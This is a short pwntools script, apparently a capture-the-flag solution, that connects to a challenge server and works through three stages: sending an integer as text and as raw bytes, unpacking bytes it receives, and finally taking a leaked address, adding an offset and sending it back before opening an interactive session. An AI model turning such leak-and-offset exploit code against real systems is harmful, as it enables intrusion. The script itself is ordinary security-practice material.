from pwn import *

# Hubungkan ke server
r = remote('152.118.201.241', 3004)

# part 1
r.recvuntil(b'Send it now, followed by a newline:\n')
r.sendline(b"1337")

r.recvuntil(b'Now, send me those exact 4 RAW bytes.\n')
r.sendline(p32(1337))

# part 2
r.recvuntil(b'Here come the bytes: ')
data = r.recvn(4)
num = u32(data)
r.sendline(str(num).encode())

# part 3
r.recvuntil(b'Here is your leak: ')
data = r.recvn(6)
data = data.ljust(8 , b'\x00')
print("data ",data)


unpacked = u64(data)
unpacked += 0x240
print("unpacked ",unpacked)
r.send(p64(unpacked))
r.interactive()